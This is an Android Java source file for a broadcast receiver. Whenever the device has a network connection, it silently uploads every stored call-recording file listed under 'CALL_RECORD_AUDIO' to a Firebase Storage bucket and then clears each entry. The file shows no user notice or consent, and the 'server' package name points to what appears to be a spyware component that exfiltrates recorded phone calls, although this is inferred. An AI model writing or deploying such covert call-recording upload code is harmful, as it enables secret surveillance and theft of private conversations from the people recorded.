package com.ronin.server;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Upload_Task extends BroadcastReceiver {

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReference();
    ExecutorService pool = Executors.newCachedThreadPool();
    Context context;

    class Go implements Runnable {
        String data, key;
        SharedPreferences sharedPreferences;

        public Go(String data, String key, SharedPreferences sharedPreferences) {
            this.data = data;
            this.key = key;
            this.sharedPreferences = sharedPreferences;
        }

        @Override
        public void run() {
            upload(data);
        }

        void upload(String path) {
            Uri file = Uri.fromFile(new File(path));
            StorageReference riversRef = storageRef.child("files/" + file.getLastPathSegment());
            UploadTask uploadTask = riversRef.putFile(file);

            uploadTask.addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception exception) {
                    Log.i("TASK", "FAIL");
                }
            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    sharedPreferences.edit().remove(key).apply();
                    Log.i("TASK", "SUCCESS");
                }
            });
        }
    }


    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;

        if (isNetworkAvailable())
            task();
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo ;
        try {
            activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        } catch (NullPointerException e) {
            e.printStackTrace();
            return false;
        }
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }


    void task() {
        SharedPreferences sharedPref = context.getSharedPreferences("CALL_RECORD_AUDIO", Context.MODE_PRIVATE);

        Map<String, ?> data = sharedPref.getAll();

        for (Map.Entry<String, ?> entry : data.entrySet()) {
            pool.execute(new Thread(new Go(entry.getValue().toString(), entry.getKey().toString(), sharedPref)));
        }
    }

}
